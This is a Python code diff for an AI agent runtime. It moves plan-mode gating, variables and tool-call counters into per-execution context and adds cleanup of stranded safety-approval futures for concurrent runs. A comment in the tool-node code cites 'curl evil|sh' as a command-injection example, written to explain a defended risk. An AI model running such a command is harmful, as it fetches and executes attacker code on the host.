@@ -291,6 +291,10 @@ class AgentRuntime:
         self._checkpoint_fail_count = 0
         self._safety_futures: dict[str, asyncio.Future[bool]] = {}
         self._safety_timeout: float = 60.0
+        # 审计 A-1 Tier1: exec_id -> {action_id/plan_id} 反向索引. future 创建时
+        # 记录归属 exec, exec 结束/异常时 reap 该 exec 残留 future (timeout 路径
+        # 异常 skip pop 的兜底). 不清别 exec 的 future (并发安全).
+        self._exec_future_keys: dict[str, set[str]] = {}
         self.tool_configs: dict[str, dict[str, Any]] = {}
         # C6 plan-as-mode: when True, write tools are gated off (read-only
         # explore phase). Flipped to False by exit_plan_mode tool call or by
@@ -448,6 +452,11 @@ class AgentRuntime:
         finally:
             try:
                 ctx_ref = context or ctx
+                # 审计 A-1 Tier1: 清本 exec 残留 future (兜底异常路径).
+                try:
+                    self._reap_exec_futures(ctx_ref.session_id)
+                except Exception as e:
+                    logger.warning("A-1 reap_exec_futures failed: %s", e)
                 writer.record_messages(
                     ctx_ref.session_id,
                     [m if isinstance(m, dict) else dict(m) for m in ctx_ref.messages],
@@ -475,15 +484,31 @@ class AgentRuntime:
         ctx = context or AgentContext()
         ctx.started_at = time.time()
         ctx.max_iterations = self.max_iterations
-        self._tool_call_chain_count = 0
-        self._safety_futures.clear()
-        self._plan_futures.clear()
+        # 审计 A-1: per-exec 状态迁 ctx, 不在 singleton 实例上 reset.
+        # _tool_call_chain_count per-exec -> ctx (见 Tier 2).
+        ctx.tool_call_chain_count = 0
+        # 审计 A-1 Tier1: 跨 RPC future 注册表 keyed by globally-unique
+        # action_id/plan_id, 并发安全本自带. 原代码 .clear() 会清掉并发
+        # 执行 A 在途的 approval future (B 一启动把 A 的挂死). 移除 clear,
+        # future 自身 pop 自清 (resolve/timeout/complete). exec 级 reaper
+        # 守卫异常路径残留 (见 _register_exec_future/_reap_exec_futures).
+        exec_id = ctx.session_id
+        self._exec_future_keys.setdefault(exec_id, set())
         # C6: honor graph-level plan_mode flag at dispatch entry.
+        # 审计 A-1 Tier2: plan_mode per-exec -> ctx, 不写 singleton.
+        # graph.plan_mode True -> 强制只读 (子图也逃不掉). False 且 context
+        # 由调用方提供 (子 runtime/并行分支) -> 继承调用方 ctx.plan_mode
+        # (父只读期子分支也只读). False 且无 context (顶层 exec) -> 默认 False.
         if getattr(graph, "plan_mode", False):
-            self.plan_mode = True
+            ctx.plan_mode = True
             logger.info("Graph %s entered plan_mode (read-only explore)", graph.id)
-        else:
-            self.plan_mode = False
+        elif context is None:
+            ctx.plan_mode = False
+        # 审计 A-1/A-2 Tier3: variables per-exec. ctx.variables 为空时从
+        # runtime seed (self.variables) 快照 copy — 隔离不共享, 并发/sub
+        # 互不污染. sub runtime 把 sub_vars 传进 ctor (self.variables=sub_vars),
+        # 子 dispatch 再 copy 进 sub_ctx, 父 self.variables 全程不被写.
+        self._seed_ctx_variables(ctx)
 
         errors = graph.validate()
         if errors:
@@ -500,7 +525,7 @@ class AgentRuntime:
             {"graph_id": graph.id, "graph_name": graph.name},
         )
 
-        initial_input = self.variables.interpolate(initial_input)
+        initial_input = ctx.variables.interpolate(initial_input)
         ctx.add_message("user", initial_input)
 
         # Issue #175: lifecycle hook — user prompt submitted.
@@ -521,7 +546,7 @@ class AgentRuntime:
         if start_node:
             system_prompt = start_node.system_prompt
             if system_prompt:
-                system_prompt = self.variables.interpolate(system_prompt)
+                system_prompt = ctx.variables.interpolate(system_prompt)
 
         has_llm_nodes = any(n.type == "llm" for n in graph.nodes.values())
         model = graph.find_llm_model()
@@ -548,7 +573,7 @@ class AgentRuntime:
             ctx.current_node_id = current_node_id
 
             if self.debugger:
-                await self.debugger.check_pause(current_node_id, self.variables.to_dict())
+                await self.debugger.check_pause(current_node_id, ctx.variables.to_dict())
 
             if node.type == "start":
                 next_id = graph.get_next_node(current_node_id)
@@ -661,7 +686,7 @@ class AgentRuntime:
                                     current_node_id,
                                 )
                         # Hooks 接入点 (M3)
-                        self._tool_call_chain_count = 0
+                        ctx.tool_call_chain_count = 0
                         logger.info(
                             "agent loop iter=%d/%d node=%s msgs=%d",
                             loop_i + 1,
@@ -704,7 +729,7 @@ class AgentRuntime:
                 if last_msg.get("tool_calls"):
                     pass
                 else:
-                    self._tool_call_chain_count = 0
+                    ctx.tool_call_chain_count = 0
                     # Issue #149: optional per-node model unload. Only fire
                     # when the node is fully done (advancing to the next
                     # node), never during tool-call re-entry on the same
@@ -865,8 +890,8 @@ class AgentRuntime:
                 state={
                     "messages": ctx.messages,
                     "iteration_count": ctx.iteration_count,
-                    "variables": self.variables.to_dict(),
-                    "tool_call_chain_count": self._tool_call_chain_count,
+                    "variables": ctx.variables.to_dict(),
+                    "tool_call_chain_count": ctx.tool_call_chain_count,
                 },
             )
             logger.debug("Checkpoint saved: graph=%s node=%s", graph.name, ctx.current_node_id)
@@ -915,11 +940,14 @@ class AgentRuntime:
         ctx.messages = state.get("messages", [])
         ctx.iteration_count = state.get("iteration_count", 0)
         ctx.current_node_id = checkpoint.current_node_id or graph.start_node_id
-        self._tool_call_chain_count = state.get("tool_call_chain_count", 0)
+        ctx.tool_call_chain_count = state.get("tool_call_chain_count", 0)
+        # 审计 A-1 Tier3: resume 重建 per-exec variables (fresh VM + 载入快照),
+        # 不写回 singleton self.variables. dispatch 见 context 提供, 不 reseed.
+        ctx.variables = VariableManager()
 
         saved_vars = state.get("variables", {})
         for k, v in saved_vars.items():
-            self.variables.set(k, v)
+            ctx.variables.set(k, v)
 
         logger.info(
             "Resumed from checkpoint: graph=%s node=%s iteration=%d",
@@ -973,10 +1001,10 @@ class AgentRuntime:
             template_name = self._extract_template_name(node_prompt)
             if template_name:
                 try:
-                    node_prompt = self.templates.render(template_name, **self.variables.to_dict())
+                    node_prompt = self.templates.render(template_name, **ctx.variables.to_dict())
                 except KeyError:
                     pass
-            node_prompt = self.variables.interpolate(node_prompt)
+            node_prompt = ctx.variables.interpolate(node_prompt)
             messages.append({"role": "system", "content": node_prompt})
 
         if self.artifact_manager and hasattr(ctx, "agent_id"):
@@ -1277,7 +1305,7 @@ class AgentRuntime:
                 errors = schema_validator.validate(extracted)
                 if not errors:
                     content = json.dumps(extracted, ensure_ascii=False)
-                    self.variables.set("structured_output", extracted)
+                    ctx.variables.set("structured_output", extracted)
                 else:
                     logger.warning("Structured output schema validation failed: %s", errors)
             else:
@@ -1320,8 +1348,8 @@ class AgentRuntime:
         )
 
         if tool_calls:
-            self._tool_call_chain_count += 1
-            if self._tool_call_chain_count > _MAX_TOOL_CALL_CHAIN:
+            ctx.tool_call_chain_count += 1
+            if ctx.tool_call_chain_count > _MAX_TOOL_CALL_CHAIN:
                 ctx.error = f"Tool call chain exceeded {_MAX_TOOL_CALL_CHAIN}"
                 yield AgentEvent(type=AgentEventType.ERROR, content=ctx.error)
                 return
@@ -1338,7 +1366,7 @@ class AgentRuntime:
                 "unregister_tool",
                 "exit_plan_mode",
             }
-            can_parallel = bool(node.parallel_tool_calls) and not self.plan_mode
+            can_parallel = bool(node.parallel_tool_calls) and not ctx.plan_mode
             parsed_calls: list[tuple[str, dict, str]] = []
             if can_parallel:
                 for tc in tool_calls:
@@ -1393,7 +1421,7 @@ class AgentRuntime:
                     # C6 plan-as-mode: gate write tools during read-only explore.
                     # exit_plan_mode is the transition primitive (handled below).
                     if (
-                        self.plan_mode
+                        ctx.plan_mode
                         and func_name != "exit_plan_mode"
                         and func_name not in self._plan_readonly_tools
                     ):
@@ -1563,7 +1591,7 @@ class AgentRuntime:
                         and result.startswith(EXIT_PLAN_MODE_SENTINEL)
                     ):
                         plan_text = result[len(EXIT_PLAN_MODE_SENTINEL) :]
-                        self.plan_mode = False
+                        ctx.plan_mode = False
                         result = f"Plan approved. Transitioning to execution.\n{plan_text}"
                         logger.info(
                             "exit_plan_mode: plan_mode->False node=%s plan_len=%d",
@@ -1738,7 +1766,7 @@ class AgentRuntime:
                         # 此都不生效. 补齐: plan_mode 只读期挡写工具, L3
                         # 内容检查走 tool_call category.
                         if (
-                            self.plan_mode
+                            ctx.plan_mode
                             and fn != "exit_plan_mode"
                             and fn not in self._plan_readonly_tools
                         ):
@@ -2085,6 +2113,36 @@ class AgentRuntime:
         logger.info("Dynamic tool unregistered: %s", tool_name)
         return f"Tool '{tool_name}' unregistered successfully"
 
+    def _register_exec_future(self, exec_id: str, key: str) -> None:
+        # 审计 A-1 Tier1: future 创建时登记归属 exec_id, 供 reap 索引.
+        self._exec_future_keys.setdefault(exec_id, set()).add(key)
+
+    def _reap_exec_futures(self, exec_id: str) -> None:
+        # 审计 A-1 Tier1: exec 结束/异常时清本 exec 残留 future (timeout 路径
+        # 异常 skip pop 的兜底). 仅清本 exec 注册的 key, 不动并发别 exec.
+        keys = self._exec_future_keys.pop(exec_id, None)
+        if not keys:
+            return
+        reaped = 0
+        for key in keys:
+            for registry in (self._safety_futures, self._plan_futures):
+                fut = registry.pop(key, None)
+                if fut is not None and not fut.done():
+                    fut.cancel()
+                    reaped += 1
+        if reaped:
+            logger.warning(
+                "A-1 reaped %d stranded futures for exec_id=%s", reaped, exec_id
+            )
+
+    def _seed_ctx_variables(self, ctx: AgentContext) -> None:
+        # 审计 A-1/A-2 Tier3: ctx.variables 播种. dispatch 入口 + 直接调用
+        # 节点 handler (测试/并行分支) 共用. None 时从 runtime seed
+        # (self.variables) 快照 copy — 隔离不共享. 已播种 (None check) 跳过.
+        if ctx.variables is None:
+            ctx.variables = VariableManager()
+            ctx.variables.load_from(self.variables.to_dict())
+
     def approve_action(self, action_id: str) -> bool:
         if self.safety_gateway:
             ok = self.safety_gateway.approve_action(action_id)
@@ -2157,6 +2215,8 @@ class AgentRuntime:
         loop = asyncio.get_running_loop()
         future: asyncio.Future[bool] = loop.create_future()
         self._safety_futures[action_id] = future
+        # 审计 A-1 Tier1: 登记归属 exec, 异常路径 reap 兜底.
+        self._register_exec_future(ctx.session_id, action_id)
 
         if self.safety_gateway:
             with self.safety_gateway._lock:
@@ -2238,6 +2298,8 @@ class AgentRuntime:
                 yield event
             return
 
+        # 防御: 直接调用 (测试/error_handler 委托) ctx.variables 未被 dispatch 播种.
+        self._seed_ctx_variables(ctx)
         params = {}
         # 审计 E-4/P0-4: 插值 → 终端命令注入. `{{user_input}}` 直连 terminal
         # `command` 时, 攻击者控制的图输入成 shell 命令 (curl evil|sh / cat
@@ -2268,13 +2330,13 @@ class AgentRuntime:
                 return
         for k, v in node.tool_params.items():
             if isinstance(v, str):
-                params[k] = self.variables.interpolate(v)
+                params[k] = ctx.variables.interpolate(v)
             else:
                 params[k] = v
 
         # C6 plan-as-mode: gate write tools on the standalone tool-node path.
         if (
-            self.plan_mode
+            ctx.plan_mode
             and node.tool_name not in self._plan_readonly_tools
             and node.tool_name != "exit_plan_mode"
         ):
@@ -2393,10 +2455,10 @@ class AgentRuntime:
 
         output_mapping = node.tool_params.get("output_mapping", {})
         if output_mapping:
-            self._apply_tool_output_mapping(output_mapping, result, node.label)
+            self._apply_tool_output_mapping(output_mapping, result, node.label, ctx)
 
     def _apply_tool_output_mapping(
-        self, output_mapping: dict, result: Any, node_label: str
+        self, output_mapping: dict, result: Any, node_label: str, ctx: AgentContext
     ) -> None:
         """把工具返回值按 output_mapping 写入变量，供下游节点 {{ var }} 引用。
 
@@ -2409,7 +2471,7 @@ class AgentRuntime:
             if not target_var:
                 continue
             if source_key in ("", "result"):
-                self.variables.set(target_var, result)
+                ctx.variables.set(target_var, result)
                 continue
             if parsed is None and isinstance(result, str):
                 try:
@@ -2421,15 +2483,15 @@ class AgentRuntime:
                         target_var,
                     )
             if isinstance(parsed, dict) and source_key in parsed:
-                self.variables.set(target_var, parsed[source_key])
+                ctx.variables.set(target_var, parsed[source_key])
             else:
-                self.variables.set(target_var, result)
+                ctx.variables.set(target_var, result)
 
     def _execute_condition_node(self, ctx: AgentContext, node: NodeConfig) -> AgentEvent:
         """Evaluate a condition node using the condition engine."""
-        expr = self.variables.interpolate(node.condition_expr)
+        expr = ctx.variables.interpolate(node.condition_expr)
         try:
-            result = self.condition_engine.evaluate(expr, ctx, self.variables)
+            result = self.condition_engine.evaluate(expr, ctx, ctx.variables)
         except Exception as e:
             logger.warning("Condition evaluation failed: %s -> %s", expr, e)
             result = "false"
@@ -2445,16 +2507,18 @@ class AgentRuntime:
         self, ctx: AgentContext, node: NodeConfig, graph: AgentGraph
     ) -> AgentEvent:
         """Execute a loop node — check if loop should continue."""
+        # 防御: 直接调用 (测试/并行分支) ctx.variables 未被 dispatch 播种.
+        self._seed_ctx_variables(ctx)
         max_iter = node.max_iterations
         loop_var = node.tool_params.get("loop_var", "loop_count")
-        current = self.variables.get(loop_var, 0)
+        current = ctx.variables.get(loop_var, 0)
         try:
             current = int(current)
         except (ValueError, TypeError):
             current = ctx.iteration_count
 
         if current < max_iter:
-            self.variables.set(loop_var, current + 1)
+            ctx.variables.set(loop_var, current + 1)
             action = "loop_continue"
         else:
             action = "loop_exit"
@@ -2561,7 +2625,7 @@ class AgentRuntime:
             return
 
         # plan_mode 激活: 只读探查, 不 fan-out 写副作用, 回退首边。
-        if self.plan_mode:
+        if ctx.plan_mode:
             first_target = outgoing[0].target_id
             logger.info(
                 "parallel node %s plan_mode active, fallback first edge -> %s",
@@ -2627,8 +2691,10 @@ class AgentRuntime:
             )
             # 审计 D-3: sub-runtime 继承父 runtime 的 plan_mode, 否则
             # 父处于只读探索期时并行分支仍可调写工具绕过门禁.
-            sub_runtime.plan_mode = self.plan_mode
+            # 审计 A-1 Tier2: plan_mode per-exec, 经 sub_ctx 传入, 子 runtime
+            # dispatch (context 提供) 继承, 不再写 sub_runtime 单例.
             sub_ctx = AgentContext()
+            sub_ctx.plan_mode = ctx.plan_mode
             sub_ctx.metadata["parallel_branch"] = edge_label or f"branch_{branch_idx}"
             branch_events: list[AgentEvent] = []
             async for event in sub_runtime.execute_graph(sub_graph, "", sub_ctx):
@@ -2818,16 +2884,21 @@ class AgentRuntime:
             yield AgentEvent(type=AgentEventType.ERROR, content=f"Sub-graph parse error: {e}")
             return
 
+        # 审计 A-2/A-1 Tier3: 父变量读自 ctx.variables (per-exec 父空间),
+        # 不碰 singleton self.variables. input_mapping 解析 → sub_input/sub_vars.
+        # 防御: 直接调用 _execute_sub_graph (测试/并行分支) ctx.variables 可能
+        # 未被 dispatch 播种 — 就地补 seed, 与 dispatch 同源.
+        self._seed_ctx_variables(ctx)
         sub_input = ""
         for parent_var, sub_var in input_mapping.items():
-            val = self.variables.get(parent_var, "")
+            val = ctx.variables.get(parent_var, "")
             if sub_var == "input":
                 sub_input = str(val)
             else:
-                self.variables.set(sub_var, val)
+                ctx.variables.set(sub_var, val)
 
         sub_vars = VariableManager()
-        sub_vars.load_from(self.variables.to_dict())
+        sub_vars.load_from(ctx.variables.to_dict())
 
         sub_runtime = AgentRuntime(
             tool_registry=self.tools,
@@ -2843,11 +2914,13 @@ class AgentRuntime:
         # memory_engine / plan_mode, 否则子图执行完全脱离安全网 (无 L3
         # 内容检查 + 无只读探索门禁 + 无持久化/记忆), 父图授权的安全策略
         # 在子图里静默失效.
-        sub_runtime.plan_mode = self.plan_mode
+        # 审计 D-3: plan_mode 经 sub_ctx 继承 (per-exec), 不写 sub_runtime 单例.
+        # 审计 A-1 Tier2: dispatch (context 提供) 继承 ctx.plan_mode.
+        sub_ctx = AgentContext()
+        sub_ctx.plan_mode = ctx.plan_mode
         # 审计 E-16: 子 runtime 继承父深度 +1, 递归计数贯穿整条子图链.
         sub_runtime._sub_graph_depth = self._sub_graph_depth + 1
 
-        sub_ctx = AgentContext()
         # Issue #175: lifecycle hook — sub-agent start.
         await self._fire_tool_hooks(
             "SUBAGENT_START",
@@ -2873,7 +2946,7 @@ class AgentRuntime:
 
         for sub_var, parent_var in output_mapping.items():
             val = sub_vars.get(sub_var, "")
-            self.variables.set(parent_var, val)
+            ctx.variables.set(parent_var, val)
 
     def _extract_template_name(self, text: str) -> str:
         """Check if text references a prompt template like {{ template:code-review }}."""
@@ -2946,7 +3019,7 @@ class AgentRuntime:
             )
             node_prompt = node.system_prompt or system_prompt or ""
             if node_prompt:
-                node_prompt = self.variables.interpolate(node_prompt)
+                node_prompt = ctx.variables.interpolate(node_prompt)
                 node_prompt += context_block
             else:
                 node_prompt = (
@@ -3034,9 +3107,9 @@ class AgentRuntime:
             },
         )
 
-        self.variables.set("current_plan_id", plan.id)
-        self.variables.set("plan_step_count", len(plan.steps))
-        self.variables.set("plan_risk", plan.overall_risk)
+        ctx.variables.set("current_plan_id", plan.id)
+        ctx.variables.set("plan_step_count", len(plan.steps))
+        ctx.variables.set("plan_risk", plan.overall_risk)
 
         step_summaries = []
         for step in plan.steps:
@@ -3071,6 +3144,8 @@ class AgentRuntime:
             loop = asyncio.get_running_loop()
             future: asyncio.Future[bool] = loop.create_future()
             self._plan_futures[plan.id] = future
+            # 审计 A-1 Tier1: 登记归属 exec, 异常路径 reap 兜底.
+            self._register_exec_future(ctx.session_id, plan.id)
             logger.info(
                 "planner node %s blocking for approval plan_id=%s timeout=%.0fs",
                 node.label,
@@ -3166,9 +3241,9 @@ class AgentRuntime:
             max_attempts=max_attempts,
         )
 
-        self.variables.set("verify_passed", result.passed)
-        self.variables.set("verify_score", result.score)
-        self.variables.set("verify_attempt", result.attempt)
+        ctx.variables.set("verify_passed", result.passed)
+        ctx.variables.set("verify_score", result.score)
+        ctx.variables.set("verify_attempt", result.attempt)
 
         yield AgentEvent(
             type=AgentEventType.VERIFY,
